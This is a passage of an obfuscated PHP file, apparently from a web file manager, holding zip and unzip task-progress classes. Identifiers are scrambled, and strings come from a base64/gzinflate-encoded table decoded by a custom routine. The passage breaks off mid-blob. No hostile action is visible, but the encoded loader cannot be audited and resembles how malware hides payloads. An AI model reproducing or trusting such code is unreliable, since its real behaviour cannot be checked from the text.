$AŠŸ‡–Ì›ˆ = array($d’»˜ğ‹Œ¶[1579] => timeFloat(), $d’»˜ğ‹Œ¶[1580] => timeFloat(), $d’»˜ğ‹Œ¶[260] => $Dä›’ÄÓ†, $d’»˜ğ‹Œ¶[1573] => $DïµŸîŠŸİ, $d’»˜ğ‹Œ¶[195] => $Fß‡èé§); goto BÂ–³½Õ¥™; B¡¦İ ™¿Ş: } public static function timeLimitCallLoop() { goto cŞä‰Æé; cğÑÔ¿¯ÇŒ: if (!$F„éç”Ù®Â && !self::$asyncAdd) { return; } $c”®Ä—Á‰ = $Aé¯¿ã­°Ç[1578]; $cî»äÁíÉÕ = Cache::get($c”®Ä—Á‰, !0); goto b×ä™‘™¾; AäÙÜØƒ‡: $C©ÌÀ Ì¾ = array(); foreach ($cî»äÁíÉÕ as $bÚ †¢‡í„ => $DŒÔÇã‚ŠÕ) { if ($BÊß£‚‡½ - $DŒÔÇã‚ŠÕ[$Aé¯¿ã­°Ç[1580]] > $DŒÔÇã‚ŠÕ[$Aé¯¿ã­°Ç[195]]) { $e²öŒ ²± = !0; try { Hook::apply($DŒÔÇã‚ŠÕ[$Aé¯¿ã­°Ç[260]], $DŒÔÇã‚ŠÕ[$Aé¯¿ã­°Ç[1573]]); write_log($Aé¯¿ã­°Ç[1583] . $bÚ †¢‡í„ . $Aé¯¿ã­°Ç[67] . $DŒÔÇã‚ŠÕ[$Aé¯¿ã­°Ç[260]] . $Aé¯¿ã­°Ç[1584] . ACTION, $Aé¯¿ã­°Ç[1575]); } catch (Exception $AÒà¬Î°Ï¥) { } continue; } $C©ÌÀ Ì¾[$bÚ †¢‡í„] = $DŒÔÇã‚ŠÕ; } if (!$e²öŒ ²±) { return; } goto d‚Ô©º÷ÈÇ; cŞä‰Æé: $Aé¯¿ã­°Ç =& $_SERVER[¹…ÕÄ]; $fÙ—‡ Ã„• = array($Aé¯¿ã­°Ç[1582]); $F„éç”Ù®Â = in_array(strtolower(ACTION), $fÙ—‡ Ã„•); goto cğÑÔ¿¯ÇŒ; d‚Ô©º÷ÈÇ: if (!$C©ÌÀ Ì¾) { return Cache::remove($c”®Ä—Á‰); } Cache::set($c”®Ä—Á‰, $C©ÌÀ Ì¾, 60); Cache::removeMemory($c”®Ä—Á‰); goto EëâĞ¥Í‡³; b×ä™‘™¾: if (!$cî»äÁíÉÕ || count($cî»äÁíÉÕ) <= 0) { return; } $e²öŒ ²± = !1; $BÊß£‚‡½ = timeFloat(); goto AäÙÜØƒ‡; EëâĞ¥Í‡³: } public static function finished($D¢ª•ù„ˆÓ, $F£á›ÃœÑ¦) { $EöĞ…ˆ‡ç =& $_SERVER[¹…ÕÄ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($EöĞ…ˆ‡ç[260] => $D¢ª•ù„ˆÓ, $EöĞ…ˆ‡ç[1573] => $F£á›ÃœÑ¦); } private static function finishedRun() { $aÖ¢¶±Š†ì =& $_SERVER[¹…ÕÄ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Dµ¢¡Î‘) { try { Hook::apply($Dµ¢¡Î‘[$aÖ¢¶±Š†ì[260]], $Dµ¢¡Î‘[$aÖ¢¶±Š†ì[1573]]); } catch (Exception $eÆ‡Şîôä¨) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto f‚¶æ­à÷±; f‚¶æ­à÷±: $E†æö¥Ş“ò =& $_SERVER[¹…ÕÄ]; parent::startAfter(); Hook::bind($E†æö¥Ş“ò[1585], array($this, $E†æö¥Ş“ò[1586])); goto d‡ŞÁŠ¦÷İ; c„¾¾ô™ å: if (!$fÍ˜¾ñ®Ñ[$E†æö¥Ş“ò[1409]]) { $fÍ˜¾ñ®Ñ[$E†æö¥Ş“ò[1409]] = LNG($E†æö¥Ş“ò[1589]); } goto f‡¹òæë¸õ; d‡ŞÁŠ¦÷İ: Hook::bind($E†æö¥Ş“ò[1067], array($this, $E†æö¥Ş“ò[1587])); $fÍ˜¾ñ®Ñ =& $this->task; $fÍ˜¾ñ®Ñ[$E†æö¥Ş“ò[1588]] = $E†æö¥Ş“ò[1072]; goto c„¾¾ô™ å; f‡¹òæë¸õ: } protected function endAfter() { $E³ĞÏ¼Ûø =& $_SERVER[¹…ÕÄ]; parent::endAfter(); Hook::unbind($E³ĞÏ¼Ûø[1585], array($this, $E³ĞÏ¼Ûø[1586])); Hook::unbind($E³ĞÏ¼Ûø[1067], array($this, $E³ĞÏ¼Ûø[1587])); } public function updateAfter() { $b¦™ÏÊóèå =& $_SERVER[¹…ÕÄ]; $b­¾Ñ´õ¡ö =& $this->task; if (!$b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1000]] || !$b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[714]]) { return; } if ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1588]] == $b¦™ÏÊóèå[1072]) { $E‡ë§ğ¯«œ = 0; if ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1547]]) { $E‡ë§ğ¯«œ = $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1548]] / $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1547]]; } $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1505]] = $E‡ë§ğ¯«œ * 0.3; } else { if ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1588]] == $b¦™ÏÊóèå[309]) { $E‡ë§ğ¯«œ = $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1014]] / $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1000]]; $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1505]] = 0.3 + $E‡ë§ğ¯«œ * 0.4; } else { if ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1588]] == $b¦™ÏÊóèå[106]) { $D«ïá½®º = 0; if ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1549]] == $b¦™ÏÊóèå[106]) { $D«ïá½®º = $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1548]]; } $E‡ë§ğ¯«œ = ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1552]] + $D«ïá½®º) / $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[714]]; $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1505]] = 0.3 + 0.4 + $E‡ë§ğ¯«œ * 0.3; } } } if ($b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1505]] > 0) { $fÒÛÈÜ´Ğ = timeFloat() - $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[736]] - $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1508]]; $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1509]] = $fÒÛÈÜ´Ğ * (1 - $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1505]]) / $b­¾Ñ´õ¡ö[$b¦™ÏÊóèå[1505]]; } } public function addFile($B³ŠÑ•´) { goto Fù¿ƒšË“„; b×ÏÛÚãàƒ: $bš°ØĞçä…[$a«õ¢‹Áâ[1002]] = $a«õ¢‹Áâ[1564]; $bš°ØĞçä…[$a«õ¢‹Áâ[1549]] = $a«õ¢‹Áâ[1072]; $bš°ØĞçä…[$a«õ¢‹Áâ[714]] = $f¡¶ŸƒÊê[$a«õ¢‹Áâ[77]]; goto fÉˆ„ÒŒëÎ; fÉˆ„ÒŒëÎ: $bš°ØĞçä…[$a«õ¢‹Áâ[1000]] = 1; $eÜ Ñ´¢“ = 0; $bš°ØĞçä…[$a«õ¢‹Áâ[1556]] = array($a«õ¢‹Áâ[1557] => $eÜ Ñ´¢“ + 1, $a«õ¢‹Áâ[407] => $f¡¶ŸƒÊê[$a«õ¢‹Áâ[28]], $a«õ¢‹Áâ[75] => $f¡¶ŸƒÊê[$a«õ¢‹Áâ[75]], $a«õ¢‹Áâ[489] => $f¡¶ŸƒÊê[$a«õ¢‹Áâ[489]] ? $f¡¶ŸƒÊê[$a«õ¢‹Áâ[489]] : $f¡¶ŸƒÊê[$a«õ¢‹Áâ[75]]); goto BÎ‚ÏÈ¥äÛ; Fù¿ƒšË“„: $a«õ¢‹Áâ =& $_SERVER[¹…ÕÄ]; $bš°ØĞçä… =& $this->task; $f¡¶ŸƒÊê = IO::info($B³ŠÑ•´); goto b³à±ù÷ã; BÎ‚ÏÈ¥äÛ: $this->update(); goto cøÒæ‡ğ–×; b³à±ù÷ã: $bš°ØĞçä…[$a«õ¢‹Áâ[1545]] = $f¡¶ŸƒÊê[$a«õ¢‹Áâ[28]]; $bš°ØĞçä…[$a«õ¢‹Áâ[1547]] = $f¡¶ŸƒÊê[$a«õ¢‹Áâ[77]]; $bš°ØĞçä…[$a«õ¢‹Áâ[1548]] = 0; goto b×ÏÛÚãàƒ; cøÒæ‡ğ–×: } public function unzipAfter($EÍÌ¢¥Ï¡¼) { goto E´œ”§Ú—¢; a½ƒÀçÔÎù: $this->update(); self::log($Fâ¬Ó™À—¼[1590] . json_encode(array($fò²—Ó©¤è, $cÍùÁ•ë’¥))); goto eÍ¡…œÛÆ¨; E´œ”§Ú—¢: $Fâ¬Ó™À—¼ =& $_SERVER[¹…ÕÄ]; $fò²—Ó©¤è =& $this->task; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1588]] = $Fâ¬Ó™À—¼[106]; goto d§–£ï²Œ; Cš¸¼á¤Â–: $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1545]] = $Fâ¬Ó™À—¼[33]; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1552]] = 0; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[714]] = $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[77]]; goto a½ƒÀçÔÎù; E¿’©ß®¦: if ($cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[29]] == $Fâ¬Ó™À—¼[173]) { $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1000]] = 1; } else { $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1000]] = $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[80]][$Fâ¬Ó™À—¼[78]]; } $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1002]] = $Fâ¬Ó™À—¼[33]; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1549]] = 0; goto dÇ¸ùòŒ´Ó; dÇ¸ùòŒ´Ó: $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1014]] = 0; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1547]] = 0; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1548]] = 0; goto Cš¸¼á¤Â–; d§–£ï²Œ: $cÍùÁ•ë’¥ = IO::infoWithChildren($EÍÌ¢¥Ï¡¼); $c£’‘ÜÜÆ = 0; $fò²—Ó©¤è[$Fâ¬Ó™À—¼[1556]] = array($Fâ¬Ó™À—¼[1557] => $c£’‘ÜÜÆ + 1, $Fâ¬Ó™À—¼[407] => $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[28]], $Fâ¬Ó™À—¼[75] => $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[75]], $Fâ¬Ó™À—¼[489] => $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[489]] ? $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[489]] : $cÍùÁ•ë’¥[$Fâ¬Ó™À—¼[75]]); goto E¿’©ß®¦; eÍ¡…œÛÆ¨: } public function nameParse($d›ßâˆ•) { goto b¿¤°“â; Bá¢İ¥øš: $this->update(); goto fŠ‡Ñ­­È; b¿¤°“â: $d¦‹¡¼„‰Ä =& $_SERVER[¹…ÕÄ]; $CçÄ·‚Û¶ù =& $this->task; if ($CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[1588]] == $d¦‹¡¼„‰Ä[1072]) { $CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[1588]] = $d¦‹¡¼„‰Ä[309]; $CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[1552]] = 0; $CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[714]] = 0; } goto DÜÜ‹Ãá˜Ó; DÜÜ‹Ãá˜Ó: $DéÕ›‰¹† = get_path_this($d›ßâˆ•); if (strstr($DéÕ›‰¹†, $d¦‹¡¼„‰Ä[94])) { $CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[1014]] += 1; $CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[1000]] += 1; } $CçÄ·‚Û¶ù[$d¦‹¡¼„‰Ä[1545]] = $d›ßâˆ•; goto Bá¢İ¥øš; fŠ‡Ñ­­È: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $B“„…¸¶ =& $_SERVER[¹…ÕÄ]; parent::startAfter(); Hook::bind($B“„…¸¶[1591], array($this, $B“„…¸¶[1586])); $a§ßÅ³çÕ“ =& $this->task; $a§ßÅ³çÕ“[$B“„…¸¶[1588]] = $B“„…¸¶[1072]; if (!$a§ßÅ³çÕ“[$B“„…¸¶[1409]]) { $a§ßÅ³çÕ“[$B“„…¸¶[1409]] = LNG($B“„…¸¶[1592]); } } protected function endAfter() { $BË’¯ ô =& $_SERVER[¹…ÕÄ]; parent::endAfter(); Hook::unbind($BË’¯ ô[1591], array($this, $BË’¯ ô[1586])); } public function updateAfter() { $E¹ˆ’—˜Š‚ =& $_SERVER[¹…ÕÄ]; $f ¿¶óÉÑØ =& $this->task; if (!$f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1000]] || !$f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[714]]) { return; } if ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1588]] == $E¹ˆ’—˜Š‚[1072]) { $f»Ò®¡â = $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1548]]; if ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1549]] != $E¹ˆ’—˜Š‚[1072]) { $f»Ò®¡â = 0; } $d ¿»á‡áÆ = ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1552]] + $f»Ò®¡â) / $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[714]]; $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1505]] = $d ¿»á‡áÆ * 0.3; } else { if ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1588]] == $E¹ˆ’—˜Š‚[309]) { $d ¿»á‡áÆ = $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1014]] / $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1000]]; $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1505]] = 0.3 + $d ¿»á‡áÆ * 0.5; } else { if ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1588]] == $E¹ˆ’—˜Š‚[106]) { $d ¿»á‡áÆ = 0; if ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1547]]) { $d ¿»á‡áÆ = $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1548]] / $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1547]]; } $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1505]] = 0.3 + 0.5 + $d ¿»á‡áÆ * 0.2; } } } if ($f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1505]] > 0) { $a™Ï’·êÒ = timeFloat() - $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[736]] - $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1508]]; $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1509]] = $a™Ï’·êÒ * (1 - $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1505]]) / $f ¿¶óÉÑØ[$E¹ˆ’—˜Š‚[1505]]; } } public function copyFileStart($c§²¹šÆ¢, $EâÔØå¨—, $FÖêè°êãĞ, $Cœ›Ñë×È, $D¸‡ì¤Ó½•, $b¾½÷ª™”) { $e„¢­ëï¬ì =& $_SERVER[¹…ÕÄ]; parent::copyFileStart($c§²¹šÆ¢, $EâÔØå¨—, $FÖêè°êãĞ, $Cœ›Ñë×È, $D¸‡ì¤Ó½•, $b¾½÷ª™”); $eí¹‘“´¯ =& $this->task; if ($eí¹‘“´¯[$e„¢­ëï¬ì[1588]] == $e„¢­ëï¬ì[309]) { $eí¹‘“´¯[$e„¢­ëï¬ì[1588]] = $e„¢­ëï¬ì[106]; } $this->update(); } public function copyFileEnd($dãù™‹Û¢â, $cÆŞñÕğÊÒ, $A°–ê®ùÚ¯, $A ÆÈ¹¤, $bÅİ’·ù¢, $dôËéÕÛ§) { $C«½ù„ŞÛï =& $_SERVER[¹…ÕÄ]; $aèÄîÔ¤ùŸ =& $this->task; $aèÄîÔ¤ùŸ[$C«½ù„ŞÛï[1548]] = $aèÄîÔ¤ùŸ[$C«½ù„ŞÛï[1547]]; $aèÄîÔ¤ùŸ[$C«½ù„ŞÛï[1552]] += $aèÄîÔ¤ùŸ[$C«½ù„ŞÛï[1547]]; $aèÄîÔ¤ùŸ[$C«½ù„ŞÛï[1549]] = $C«½ù„ŞÛï[33]; $this->update(); } public function nameParse($f£ù¾í£Š) { $cİ”ŒŞ‰Ÿ =& $_SERVER[¹…ÕÄ]; $B‹²Ö²Õš¤ =& $this->task; if ($B‹²Ö²Õš¤[$cİ”ŒŞ‰Ÿ[1014]] < $B‹²Ö²Õš¤[$cİ”ŒŞ‰Ÿ[1000]]) { $DŒ‰ø¶øÏÑ = get_path_this($f£ù¾í£Š); if (strstr($DŒ‰ø¶øÏÑ, $cİ”ŒŞ‰Ÿ[94])) { $B‹²Ö²Õš¤[$cİ”ŒŞ‰Ÿ[1014]] += 1; } } if ($B‹²Ö²Õš¤[$cİ”ŒŞ‰Ÿ[1588]] == $cİ”ŒŞ‰Ÿ[1072]) { $B‹²Ö²Õš¤[$cİ”ŒŞ‰Ÿ[1588]] = $cİ”ŒŞ‰Ÿ[309]; } $B‹²Ö²Õš¤[$cİ”ŒŞ‰Ÿ[1545]] = $f£ù¾í£Š; $this->update(); } } goto b’‘¨ÒŒ‡¤; Fô´™ ®§†: if (!function_exists('_kodDe')) { function _kodDe($a•×³Ø­Ò) { $a•×³Ø­Ò = base64_decode($a•×³Ø­Ò); $e·¹‘¥›— = strlen($a•×³Ø­Ò); $BÚô‰°Š¸Ø = ''; $FÏ˜¬†„îé = ord($a•×³Ø­Ò[0]) - 30; for ($E—œô›‘É‡ = 1; $E—œô›‘É‡ < $e·¹‘¥›—; $E—œô›‘É‡ += 2) { if ($E—œô›‘É‡ + 1 < $e·¹‘¥›—) { $BÚô‰°Š¸Ø .= chr(ord($a•×³Ø­Ò[$E—œô›‘É‡ + 1]) + $FÏ˜¬†„îé); $BÚô‰°Š¸Ø .= chr(ord($a•×³Ø­Ò[$E—œô›‘É‡]) + $FÏ˜¬†„îé); } else { $BÚô‰°Š¸Ø .= chr(ord($a•×³Ø­Ò[$E—œô›‘É‡]) + $FÏ˜¬†„îé); } } return $BÚô‰°Š¸Ø; } } define("\xb9\x85\xd5\xc4", _kodDe('LOGvxNeW')); $_SERVER[¹…ÕÄ] = explode(base64_decode('fAR8BHwE'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\123\125\326\270\273\243\343\270\216\353\300\370\50\140\27\262\264\120\266\102\251\241\115\333\110\332\224\44\245\100\133"."\xc3\x4b\xf2\x92\xbc\x36\xc9\x4b\xdf\x7b\xe9\x6\x8c\xb\x8a\xca\xa2\xa3\xa0\x8e\x3a\x2e\xb8\x20\x6e\xb8\x23\x2e\xb8\x8e\xbb\xe8\xcc\xb8\xa3\x88\x82\x80\xb\xe3\x36\xa2\x8e\xce\xf2"."\335\375\336\367\22\234\357\373\375\377\12\344\356\313\271\347\236\173\316\275\347\234\367\217\147\126\336\160\333\327\333\27\35\4\377\277\177\375\267\153\356\173\175\357\233"."\70\266\350\300\105\7\57\332\37\207\117\135\376\213\375\320\177\7\56\137\126\126\326\74\351\360\161\255\107\134\362\300\135\362\172\371\56\171\105\300\377\362\53\276\137".base64_decode('vXrnGd5dN708tGv//d7814tX1oDCuG4N/pGymikpg6phGjghpmUTahKH1Sz+').base64_decode('deMfoy+tmgoOR1oD4Uiova3NGwxHSItifkaLk1BO1uUMaTyn6AboSmwuktNy').strrev('¬(ÍXfë)ÁC!ôW—Ò4D¤¼ÚóÂEæómàÒ30Ô´ƒeG)²âÂ’ÖJ').base64_decode('xIDOxjXT2+RrlcJBT2vIUx/2BVpxcn2gpcUXLkwPBvz+mZ76WYU5bUFPU4tH')."\x2\xe3\x4b\x2b\x11\x35\x9b\xd0\xca\xa4\x5\x38\x67\x81\x54\x8e\x3\x8d\xaa\x92\x8e\xe3\x60\x56\xa6\xc3\x31\x87\x72\x24\x14\x66\x21\xb0\x6\xd9\x7c\x3a\x8d\x23\xad\x2c\x44\xc6\xaf"."\x24\xe4\x7c\x9a\xc0\xac\x41\x8c\xe4\x74\x35\x23\xd3\xa9\xcf\x52\x86\x58\x2a\xe\xc8\x79\x53\x53\xb3\x31\x1c\xf1\xe\x9a\xba\xcc\xd3\xc1\x88\x63\xba\x92\x51\xb2\xa4\xa9\x90\xd7\xef"."\255\17\113\160\230\122\143\60\320\42\221\245\310\310\206\251\350\122\107\263\67\350\225\340\320\153\113\321\214\113\45\134\257\275\25\0\104\362\370\375\322\276\132\60\225"."\114\216\66\203\353\24\151\54\20\154\360\6\245\231\363\44\16\247\230\226\311\150\131\27\150\5\254\247\51\14\325\33\14\342\200\203\140\260\337\7\227\216\104\2\215".strrev('M	¤¬‚yªÍO¸Aš¿!ù)oñ{Yó§/Ò3iÅ‰jX L‘ƒöÍÉ‘‹/!')."\x63\x3b\x87\x4\xf2\xb4\xb4\x42\x53\x32\xa0\x9a\x46\xf6\x14\xd8\x60\xfd\x38\x58\x3b\x3\xff\x4e\x23\x85\xa2\x11\x98\xa7\xe8\x66\x44\xc9\xc6\xb4\xb8\x9a\x25\xdb\xb0\x8e\x6c\x39\x82".base64_decode('eLKZatBVUI40qLliWm6oResnc0ioacXPdllCS8cVncdzoLqYQyajDgu1W/MZ')."\xb1\x8\x8b\xc6\x52\x6a\x3a\xae\xd3\xcd\xf9\x73\x25\xc1\xf6\x57\x13\x43\x7c\x13\x1a\x5a\x5e\x8f\x29\x3e\xb0\x4d\x78\xdd\x36\x36\x92\x2a\x52\x48\x31\x4d\x30\x69\x83\xce\xab\x3d\x97"."\326\344\170\110\321\205\271\66\202\212\201\274\51\46\346\121\261\106\115\317\64\0\162\101\372\7\233\104\155\57\222\321\113\267\111\134\0\241\13\377\270\313\72\317\161".strrev('1>%ªFÉI/¨à¤¬ÕDmÕÎƒDø™NÙ'."\n".'ƒ(%)hd]y¡9Oğtó»»ş')."\x82\x6a\x91\x91\x67\xe3\xca\xa0\x2b\x97\xca\xe1\x28\xdf\xee\x5d\x16\x74\x87\xab\xd3\xaa\x99\x5e\x81\x20\xa7\xb5\x98\x9c\x16\x67\x8a\xc3\x29\xd3\xcc\x85\x94\x6c\x1c\x2\x84\xcc\x48".base64_decode('G8gigOUUhRRqcEhxqUWaJzXXqDUGrZhJsxCdHUszWKI5SDCmhMSVQZMARZoW')."\x4b\xc9\x3a\x58\xae\xda\xbc\x99\x70\x4e\xc1\x89\x72\x2e\x97\x56\x63\xb2\xa9\x6a\x59\xb7\x16\x33\x15\xd3\x69\x98\xba\x22\x93\xd6\x3c\xb1\x98\x62\x18\xce\x7a\x2d\x6b\xea\x5a\xda\xe9".strrev('Nè¡#YË­+$÷F÷¡t\\A&™-ŞÈkHNæØ&`eÀªF¶j“W@gµ§I').strrev('Šê§0w¬ ¥Y«Mš¼¦kæğ¦RÇ)¦É#W‡'."\n".'†iÈÕ±iFX54Ù/')."\101\307\52\65\265\204\111\43\240\165\305\331\246\313\311\214\134\43\345\362\121\0\31\262\173\213\244\341\322\4\64\65\122\14\106\35\122\46\157\230\116\135\1\304\111"."\5\307\40\131\143\137\302\331\2\267\226\252\304\235\41\100\303\111\362\204\312\152\11\240\215\104\363\160\152\163\70\334\26\361\65\202\243\272\325\33\151\361\204\353\233"."\xc9\xb0\x4d\x39\x49\xc7\xec\x7\x94\x99\x35\x49\x13\xe7\x3a\xc1\x16\x83\x88\xd5\xa\xe6\xca\x13\xdb\xb4\x1\x45\x7\x1d\xcf\x1c\xaa\x91\x7a\xb5\x78\x54\x1b\x74\xd1\x2c\x58\x38\x4"."\150\10\55\14\227\73\147\72\203\162\66\11\341\23\35\62\25\202\176\106\177\322\12\150\277\222\115\232\51\132\61\344\15\316\361\6\43\241\100\143\270\303\23\44\207".strrev('Kä(œ` šûóÍ7š+\\7-„äõ¤Ì}'."\0".'8•v6'."\n".'í É`|').base64_decode('0bb9akaFYzdZDoIk4ACayIDcaEK1XamKsq74uHIn+LeivLOrwVXRXedWeR13').base64_decode('latKGl85SWoDLIkqpyUy6YISlVJg1s8AAJ5Ywra2gQ4nBr2z272hcKTFG24O')."\x34\x90\x1e\xbc\x1e\x12\xf2\x6b\x78\x6b\xd2\x19\x75\xe2\x9f\x6e\xb2\x82\x9\x4c\x56\x7d\x19\x39\x69\xa3\xd2\x30\xd6\xa2\xe9\x8a\x35\x85\xac\x25\x58\xf1\xe\x35\x4e\xc9\x38\x8c\x36"."\53\152\62\105\346\247\302\326\142\132\132\323\345\64\244\142\24\211\25\112\131\222\152\202\254\17\46\230\74\22\122\63\71\112\327\314\124\76\23\25\202\156\76\24\322"."\x2f\x58\x79\x7a\xd0\xa4\x34\x76\xd0\x69\x3a\x9\xd5\xb8\x49\x95\xb1\xe3\x1b\xc9\x36\xa\xb8\x43\x13\xc0\x1f\x4e\x90\xe3\x5a\x46\xa6\xec\x2e\x22\x4e\x4a\x1c\x53\x27\x9c\x54\x61\xc9".base64_decode('aVZkfnKauqnBVN1SpEUxUxpZrqRCh5RnY6OjjCtphcIlpVDiDni4fgYuwKiB')."\60\77\113\125\43\10\12\102\306\211\306\73\40\177\313\23\114\126\64\15\216\221\100\264\7\354\23\34\217\250\106\243\160\352\107\64\224\7\306\52\363\362\155\272\222"."\120\311\156\313\202\245\152\221\365\136\132\1\54\15\77\157\140\104\150\254\261\335\357\217\324\7\132\303\200\147\306\51\35\101\137\330\113\221\323\323\20\361\324\267\341".base64_decode('WEZcalIAUgordnP+uH88mRg8gvhZxak4AQSi0jgMyHJOyxqKM0Zai3N6jktM')."\263\21\363\202\32\234\123\37\164\312\231\141\147\6\200\311\311\206\156\75\132\245\60\116\305\47\264\217\54\43\247\333\20\260\100\20\242\147\172\133\40\104\52\324\301"."\124\300\66\105\25\235\214\243\255\235\144\145\4\24\152\362\222\304\303\11\326\245\144\302\64\171\72\102\224\346\346\101\171\135\35\226\371\34\353\350\170\110\333\203\231"._kodDe('L9YjnPNhoqThJvdJ6jRW8UlN/LNu+cZB9x+nrKywnAYyO0YIjib3QUrwyok40g==')."\361\373\354\305\275\163\175\241\160\250\150\26\110\153\367\332\162\200\354\327\26\364\66\372\346\262\150\243\317\353\157\10\105\352\75\365\315\274\114\253\247\205\104\42\11"."\50\175\31\156\153\371\10\240\255\41\46\303\105\372\241\74\112\201\25\261\10\114\21\52\12\104\70\36\200\163\122\41\270\107\246\13\245\140\64\23\302\234\307\264\74".base64_decode('xUbGH2YoEcnIZFvJ9Awswz/lkickmTnSBiAX0SEWRNOgccAJkv4lQucLRhCB').base64_decode('ZWYqCUayiyd4EiajArY42Bc8D6yAB4nbABPQikToXjOAoOKhw0lwUTcSaPMG')."\x3d\x50\x50\x8e\x74\x4\x3\xad\x4d\xa4\xc2\x40\x4a\xa1\x3\xf0\x11\xf0\x97\x51\xbe\x89\xc8\xcb\x26\x27\x61\x80\xe9\x91\xa9\xec\xc4\x81\xde\xa3\x51\x50\x2e\xc2\x3f\xa7\xe1\x1f\xc0".base64_decode('75HOlSyFehQSb5MOlgQSYDeQYFzLs96imkZ6SMOjHwcBPWCSdo9BkWSQEp9x')._kodDe('MbCRXy5xbaDwmql3/iVGTRM7EJ/tDVjtNVdPQaqvfy6GdVxf29ZKmLhJAcRbJQ==')."\x82\xc5\xa\x38\xa3\x48\xf7\xee\x33\xbb\x6\xc6\x95\x75\x3a\xc7\xb9\xba\x41\xa0\xbc\xe2\x74\x1c\x25\xb1\x2e\x97\x25\x3a\x86\xd4\xcf\xeb\xac\x36\xe4\x88\xca\x8c\xba\xf2\x9a\x2e\x77"."\x97\xbb\xac\xae\xa6\xd3\xe3\x1c\x96\x9d\xc3\x95\xce\xa9\xce\xee\x71\x5d\xae\xf2\x71\x24\xa1\x7b\xe1\x78\x47\xf5\x62\x58\x0\x14\xac\x1b\xdd\xd\x7e\x6a\xbb\xea\xc6\x76\x39\x4f\xfb"."\335\202\323\73\273\272\113\153\306\215\352\162\215\356\32\350\256\50\257\243\375\304\362\72\220\22\143\103\154\250\361\161\145\140\110\200\123\142\105\262\210\344\11\5\150"."\306\260\232\343\251\13\47\55\246\351\140\15\225\44\257\321\351\354\32\327\135\47\324\23\222\354\175\1\56\11\320\337\24\53\347\161\316\207\63\143\125\341\276\47\370"."\221\317\306\70\365\204\373\42\52\307\10\35\120\223\131\266\205\300\241\317\244\163\53\203\276\160\54\376\135\114\27\62\251\220\115\217\56\326\164\202\235\371\254\332\107"."\357\34\262\112\37\11\150\46\305\357\250\142\16\50\24\75\100\272\45\16\220\203\112\204\40\113\210\245\21\77\110\172\340\222\231\202\304\24\62\213\134\4\62\143\3"."\54\26\127\262\144\235\16\43\245\215\230\234\123\102\302\14\43\221\260\147\246\337\33\241\24\206\120\142\32\107\124\161\46\273\245\3\123\343\24\225\322\207\30\347\316"."\221\40\102\